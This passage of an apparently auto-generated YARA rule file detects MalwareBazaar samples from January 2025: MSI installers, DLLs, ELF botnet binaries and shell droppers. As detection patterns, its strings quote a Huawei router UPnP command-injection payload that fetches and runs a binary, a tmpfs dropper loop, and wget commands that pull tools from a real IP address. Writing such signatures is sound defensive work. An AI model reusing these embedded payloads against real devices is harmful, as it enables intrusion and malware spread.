      description = "evidences - from files 636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5.msi, a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9.msi, e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f.msi, fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5"
      hash2 = "a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9"
      hash3 = "e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f"
      hash4 = "fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{F24F4CB8-1C5F-4258-A565-F326F70BA51B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "6\\)~c/\"" fullword ascii /* hex encoded string 'l' */
      $s4 = "* v=4o" fullword ascii
      $s5 = "* 0GZP+" fullword ascii
      $s6 = "1#D:\"m" fullword ascii
      $s7 = "N:\\b\"s" fullword ascii
      $s8 = "gEt%~^L" fullword ascii
      $s9 = " -c]~}" fullword ascii
      $s10 = ">$(^- " fullword ascii
      $s11 = "vs /Iy" fullword ascii
      $s12 = "(_.Juc" fullword ascii
      $s13 = "zoWhVtg" fullword ascii
      $s14 = "sXwLu~l" fullword ascii
      $s15 = "mzxW}@g" fullword ascii
      $s16 = "tHthl)T" fullword ascii
      $s17 = "KfEW<.h" fullword ascii
      $s18 = "KByF][w" fullword ascii
      $s19 = "{0EDEF991-300A-44FE-919E-AAF24CBFC3B4}" fullword ascii
      $s20 = ";BnXJ\"?" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 25000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b_c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896c_6 {
   meta:
      description = "evidences - from files 4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b.msi, c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b"
      hash2 = "c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{F7463C1B-57EF-4D19-AD81-9ED639A060D5}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "9- `ni" fullword ascii
      $s4 = "zZ_%v%0" fullword ascii
      $s5 = "YLSgUo9" fullword ascii
      $s6 = "=u3hQ!." fullword ascii
      $s7 = "K}IEu%y%" fullword ascii
      $s8 = "bf|x( -r" fullword ascii
      $s9 = "ZMBnDol7" fullword ascii
      $s10 = "me@(!." fullword ascii
      $s11 = "x* ~G4" fullword ascii
      $s12 = "Hq /y-?" fullword ascii
      $s13 = "YuFWUQ3" fullword ascii
      $s14 = "d{g* 8" fullword ascii
      $s15 = "yMrF7hY" fullword ascii
      $s16 = "JCOWl%|^" fullword ascii
      $s17 = "sBzu#;7%" fullword ascii
      $s18 = "'0]$obsl1[5T" fullword ascii
      $s19 = "~juUNJI?\"h" fullword ascii
      $s20 = "3ezAd2RS" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 23000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72_2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2_7 {
   meta:
      description = "evidences - from files 254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72.msi, 2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477.msi, 3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e.msi, 4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b.msi, 5a1839968a7be93c0c1f8110167ba701a08fd02bc261373299002907b75cf7f1.msi, 636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5.msi, 7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf.msi, 9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c.msi, a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9.msi, a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43.msi, a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba.msi, b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864.msi, b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea.msi, bb48759e546b346ff0ea1cf7e9a464845060b568dd82272c62f7ef6a301393e9.msi, bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc.msi, c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1.msi, c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c.msi, e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f.msi, e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939.msi, fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72"
      hash2 = "2972c4558642fe361da9ce7871949032b34c56cb1a58ac4929363ad8a2e10477"
      hash3 = "3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e"
      hash4 = "4d045f64ac5a03ae0c996229ed790f5cb17e117cec7c3b0e968bd385b0296c1b"
      hash5 = "5a1839968a7be93c0c1f8110167ba701a08fd02bc261373299002907b75cf7f1"
      hash6 = "636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5"
      hash7 = "7d4118c389a432d16f6047612fa65af4d8464146fa0ec69723cc7e08bd8ab7bf"
      hash8 = "9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c"
      hash9 = "a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9"
      hash10 = "a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43"
      hash11 = "a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba"
      hash12 = "b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864"
      hash13 = "b2ca7b7531cc246e0db8bde9e025cc41fe91208c11f32b8383700c6638a348ea"
      hash14 = "bb48759e546b346ff0ea1cf7e9a464845060b568dd82272c62f7ef6a301393e9"
      hash15 = "bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc"
      hash16 = "c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1"
      hash17 = "c6565ad633a1837483699faa80f58f71aa3e8048419bf9aa94f2a6896cbeb74c"
      hash18 = "e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f"
      hash19 = "e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939"
      hash20 = "fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "get_loader_name_from_dll" fullword ascii
      $s6 = "Update.dll" fullword ascii
      $s7 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s8 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "qgethostname" fullword ascii
      $s11 = "process_config_directive" fullword ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s14 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s17 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s18 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s19 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72_3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daa_8 {
   meta:
      description = "evidences - from files 254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72.msi, 3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e.msi, 636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5.msi, 9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c.msi, a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9.msi, a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43.msi, a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba.msi, b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864.msi, bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc.msi, c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1.msi, e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f.msi, e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939.msi, fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "254fb5e9b88c97494475e55bf157fc6fd062b245a671b5a002fa1bba20c10f72"
      hash2 = "3bee8bebad8ebf99b10258827587ffd2b6d00efb9379605319ab0d7daab4a91e"
      hash3 = "636b1ea7a109ba4a5f8e545d3f0f9c22ab95ad6f993d0f39cfde579a65000df5"
      hash4 = "9d0ced67c335ef36bed46f9aea9c5fe678ca22b7411f5794a50662d0619a7e4c"
      hash5 = "a3546c862cf95e6971d41b79e9c03a1fd029fbe430323dcc703720b46e005cf9"
      hash6 = "a3765eb6b2a903e811347aa2d5762961d055d5fa0aa8c6a59eb3cf9904285a43"
      hash7 = "a87c9d1b1bc9234b87166fbd1ca92078975203f8a6eb4e7bee1cbbcfe0677bba"
      hash8 = "b188062a0e464782e482e19fe7200a2b20deaca175ccd30e2cea8c8cd943c864"
      hash9 = "bdb274c47091a0e4887b69b4709d03df1b1177a4a4c398435e5f06e5bb4a47fc"
      hash10 = "c1c1305ab2672350a0ab8a94da33d65efec6931c318174426ba0ffb9780f10d1"
      hash11 = "e4293872c79e70f9de46de4a6196e6de8d5c662f912056e6e65b8d9bd290617f"
      hash12 = "e59040383fcc8b6c3d0f0212e0aeea0c4675afd2132ee3a9af3295faae85f939"
      hash13 = "fca67fb0570f40df1ca36dcf8fd3da12c5785933cf365c9c126a31ea923b79bb"
   strings:
      $s1 = "gL&G- s" fullword ascii
      $s2 = "NnvhdXc6" fullword ascii
      $s3 = "fdm- A" fullword ascii
      $s4 = "\\IjOX~eE" fullword ascii
      $s5 = "H=+ \"7" fullword ascii
      $s6 = "d(0C%e%" fullword ascii
      $s7 = "# f($Vd" fullword ascii
      $s8 = "mimehg" fullword ascii
      $s9 = "HcJVmi4" fullword ascii
      $s10 = "NKEb'4S" fullword ascii
      $s11 = "IPUV,%6:" fullword ascii
      $s12 = "WSYutf?" fullword ascii
      $s13 = "XXWD4a/-\"" fullword ascii
      $s14 = "orhV~Xe" fullword ascii
      $s15 = "JTXkjj@7" fullword ascii
      $s16 = "5tmpu`x" fullword ascii
      $s17 = "dgFjN%]" fullword ascii
      $s18 = "9%$tedyQVl" fullword ascii
      $s19 = "Bjhf *hd" fullword ascii
      $s20 = ")BMyUAOQP" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714_e493d38dcca74cc9d8309c966728e71bb3a93b342ab77ab50b4fa3ef78_9 {
   meta:
      description = "evidences - from files 297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714.dll, e493d38dcca74cc9d8309c966728e71bb3a93b342ab77ab50b4fa3ef7890d0da.dll"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714"
      hash2 = "e493d38dcca74cc9d8309c966728e71bb3a93b342ab77ab50b4fa3ef7890d0da"
   strings:
      $s1 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\per_thread_data.cpp" fullword ascii
      $s2 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_type_info.cpp" fullword ascii
      $s3 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_exception.cpp" fullword wide
      $s4 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\winapi_downlevel.cpp" fullword wide
      $s5 = "UTF-8 isn't supported in this _mbtowc_l function yet!!!" fullword wide
      $s6 = "_loc_update.GetLocaleT()->locinfo->_public._locale_lc_codepage != CP_UTF8 && L\"UTF-8 isn't supported in this _mbtowc_l function" wide
      $s7 = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.35.32215\\include\\xmemory" fullword wide
      $s8 = "minkernel\\crts\\ucrt\\src\\appcrt\\heap\\new_handler.cpp" fullword wide
      $s9 = "minkernel\\crts\\ucrt\\src\\appcrt\\internal\\win_policies.cpp" fullword wide
      $s10 = "minkernel\\crts\\ucrt\\src\\appcrt\\convert\\c32rtomb.cpp" fullword wide
      $s11 = "c32 < (1u << (7 - trail_bytes))" fullword wide
      $s12 = "minkernel\\crts\\ucrt\\src\\appcrt\\lowio\\close.cpp" fullword wide
      $s13 = "`template-parameter-" fullword ascii
      $s14 = "wcsncpy_s(names->szLanguage, (sizeof(*__countof_helper(names->szLanguage)) + 0), section.ptr, section.length)" fullword wide
      $s15 = "wcsncpy_s(names->szCountry, (sizeof(*__countof_helper(names->szCountry)) + 0), section.ptr, section.length)" fullword wide
      $s16 = "wcsncpy_s(names->szCodePage, (sizeof(*__countof_helper(names->szCodePage)) + 0), section.ptr, section.length)" fullword wide
      $s17 = "_loc_update.GetLocaleT()->locinfo->_public._locale_mb_cur_max > 1" fullword wide
      $s18 = "locale_update.GetLocaleT()->locinfo->_public._locale_mb_cur_max == 1 || locale_update.GetLocaleT()->locinfo->_public._locale_mb_" wide
      $s19 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\github\\stl\\inc\\optional" fullword wide
      $s20 = "wcsncpy_s(names->szLocaleName, (sizeof(*__countof_helper(names->szLocaleName)) + 0), section.ptr, section.length)" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714_66640672478590001f0d1524ea7a3ef10c7dec9848e999560aadae4479_10 {
   meta:
      description = "evidences - from files 297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714.dll, 66640672478590001f0d1524ea7a3ef10c7dec9848e999560aadae4479537c7b.exe, e493d38dcca74cc9d8309c966728e71bb3a93b342ab77ab50b4fa3ef7890d0da.dll"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "297e5d0d0e278489163b492f03057e4f9652752b17bc0b45575b9e375710b714"
      hash2 = "66640672478590001f0d1524ea7a3ef10c7dec9848e999560aadae4479537c7b"
      hash3 = "e493d38dcca74cc9d8309c966728e71bb3a93b342ab77ab50b4fa3ef7890d0da"
   strings:
      $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s2 = "AppPolicyGetThreadInitializationType" fullword ascii
      $s3 = " Type Descriptor'" fullword ascii
      $s4 = "operator co_await" fullword ascii
      $s5 = "operator<=>" fullword ascii
      $s6 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s7 = " Class Hierarchy Descriptor'" fullword ascii
      $s8 = " Base Class Descriptor at (" fullword ascii
      $s9 = " Complete Object Locator'" fullword ascii
      $s10 = "__swift_2" fullword ascii
      $s11 = " delete[]" fullword ascii
      $s12 = "__swift_1" fullword ascii
      $s13 = "api-ms-win-core-file-l1-2-2" fullword wide /* Goodware String - occured 1 times */
      $s14 = " delete" fullword ascii
      $s15 = " new[]" fullword ascii
      $s16 = "api-ms-" fullword wide
      $s17 = "ext-ms-" fullword wide
      $s18 = " Base Class Array'" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61_4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6_11 {
   meta:
      description = "evidences - from files 1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61.elf, 4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6b6cf87.elf, 5f5444dd4e8a7cce6aa3b1b00c37bdaca26dca9814067e3564d6cad498b78963.elf, d31ff5cfdb5dcd9f152ae02d715239a45b0e451661f092fa890abb64dd7df916.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61"
      hash2 = "4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6b6cf87"
      hash3 = "5f5444dd4e8a7cce6aa3b1b00c37bdaca26dca9814067e3564d6cad498b78963"
      hash4 = "d31ff5cfdb5dcd9f152ae02d715239a45b0e451661f092fa890abb64dd7df916"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "User-Agent: wget (dlr)" fullword ascii
      $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s6 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s7 = "HOST: 255.255.255.255:1900" fullword ascii
      $s8 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s9 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s10 = "service:service-agent" fullword ascii
      $s11 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s12 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s13 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s14 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s15 = "assword" fullword ascii
      $s16 = "sername" fullword ascii
      $s17 = "Error 2" fullword ascii
      $s18 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s19 = "Error 6" fullword ascii
      $s20 = "Error 5" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61_4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6_12 {
   meta:
      description = "evidences - from files 1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61.elf, 4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6b6cf87.elf, 5f5444dd4e8a7cce6aa3b1b00c37bdaca26dca9814067e3564d6cad498b78963.elf, 6ef5eb1aa43924d6ba67ef4133c140af11562daf17119c2b905b096e8dbee306.elf, d31ff5cfdb5dcd9f152ae02d715239a45b0e451661f092fa890abb64dd7df916.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "1f0bf95b44e9575362800417949f11b3454b0fe3f9efbc7230c0b4b075470c61"
      hash2 = "4c172ae4e48aa3d629859da575ae464294e4b50739a42084c16e2f37a6b6cf87"
      hash3 = "5f5444dd4e8a7cce6aa3b1b00c37bdaca26dca9814067e3564d6cad498b78963"
      hash4 = "6ef5eb1aa43924d6ba67ef4133c140af11562daf17119c2b905b096e8dbee306"
      hash5 = "d31ff5cfdb5dcd9f152ae02d715239a45b0e451661f092fa890abb64dd7df916"
   strings:
      $s1 = "/bin/busybox echo -ne " fullword ascii
      $s2 = "usage: busybox" fullword ascii
      $s3 = "/sys/devices/system/cpu" fullword ascii
      $s4 = " HTTP/1.0" fullword ascii
      $s5 = "/proc/stat" fullword ascii
      $s6 = "/var/run/" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "/var/tmp/" fullword ascii
      $s8 = "/home/" fullword ascii /* Goodware String - occured 2 times */
      $s9 = "/boot/" fullword ascii
      $s10 = "/dev/shm/" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _1c60ae283668b07e0eb396fe8e32ae94ea4f2d84ded8997bf431392faa0e52a3_272e6696a73e9c7d76b54196611ea97aed60298924cd145695e83e9f83_13 {
   meta:
      description = "evidences - from files 1c60ae283668b07e0eb396fe8e32ae94ea4f2d84ded8997bf431392faa0e52a3.sh, 272e6696a73e9c7d76b54196611ea97aed60298924cd145695e83e9f8348cba0.unknown, 2e5e6b1c4307807a36007e9f8df77fa4948a60f8533ead168e09ec5b241fff4c.sh, 5dfa1f0a22636bf2421116554bb4e3f3d82728643889f8326245a53be87e32ff.sh, 7ffe4d701312bc48994f01ce6e560242004918e445b87e672469691ee54939c1.unknown, 8c87d43a225f2b04a013fbabb5e7ecdae3023cfe6a8b8bfcfc4c329be94dce10.unknown, a37c246bf8a6b29966fd7748721a232e55131007c9b51c7ff2ac4fafaa841247.sh, a42cca9188e76c22c4bf78fb9821155323da79c3e2ad49be53ff3dc3ff074615.sh, bfb6514dba65e9a1113e45a17bd2d787542e48cf8e0ed64e8c2967bec91e10a4.unknown, d52aac17b47d382cccbc70021f7bfd04e0942c938763069f4ce2d1275cf2627a.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "1c60ae283668b07e0eb396fe8e32ae94ea4f2d84ded8997bf431392faa0e52a3"
      hash2 = "272e6696a73e9c7d76b54196611ea97aed60298924cd145695e83e9f8348cba0"
      hash3 = "2e5e6b1c4307807a36007e9f8df77fa4948a60f8533ead168e09ec5b241fff4c"
      hash4 = "5dfa1f0a22636bf2421116554bb4e3f3d82728643889f8326245a53be87e32ff"
      hash5 = "7ffe4d701312bc48994f01ce6e560242004918e445b87e672469691ee54939c1"
      hash6 = "8c87d43a225f2b04a013fbabb5e7ecdae3023cfe6a8b8bfcfc4c329be94dce10"
      hash7 = "a37c246bf8a6b29966fd7748721a232e55131007c9b51c7ff2ac4fafaa841247"
      hash8 = "a42cca9188e76c22c4bf78fb9821155323da79c3e2ad49be53ff3dc3ff074615"
      hash9 = "bfb6514dba65e9a1113e45a17bd2d787542e48cf8e0ed64e8c2967bec91e10a4"
      hash10 = "d52aac17b47d382cccbc70021f7bfd04e0942c938763069f4ce2d1275cf2627a"
   strings:
      $s1 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s2 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s3 = ">/var/tmp/.a && cd /var/tmp;" fullword ascii
      $s4 = ">/home/.a && cd /home;" fullword ascii
      $s5 = ">/tmp/.a && cd /tmp;" fullword ascii
      $s6 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii
      $s7 = ">/var/.a && cd /var;" fullword ascii
      $s8 = ">/dev/.a && cd /dev;" fullword ascii
      $s9 = ">/dev/shm/.a && cd /dev/shm;" fullword ascii
   condition:
      ( uint16(0) == 0x2f3e and filesize < 7KB and ( all of them )
      ) or ( all of them )
}

rule _4014fd11adf44f0079bbb11f45545f444c5dc60574a1e31f7547d2e65959c41c_a8d4bb9ec84e3cfe30d77780b6e885940486e2c92bcf23bf7f67d93d61_14 {
   meta:
      description = "evidences - from files 4014fd11adf44f0079bbb11f45545f444c5dc60574a1e31f7547d2e65959c41c.sh, a8d4bb9ec84e3cfe30d77780b6e885940486e2c92bcf23bf7f67d93d610725e5.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-04"
      hash1 = "4014fd11adf44f0079bbb11f45545f444c5dc60574a1e31f7547d2e65959c41c"
      hash2 = "a8d4bb9ec84e3cfe30d77780b6e885940486e2c92bcf23bf7f67d93d610725e5"
   strings:
      $s1 = "wget http://185.157.247.12/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://185.157.247.12/.a/gdb -O- > gdb" fullword ascii
      $s3 = "wget http://185.157.247.12/.a/strace -O- > strace" fullword ascii
      $s4 = "wget http://185.157.247.12/.a/socat -O- > socat" fullword ascii
      $s5 = "cd /tmp" fullword ascii
   condition:
      ( uint16(0) == 0x6463 and filesize < 1KB and ( all of them )
      ) or ( all of them )
}
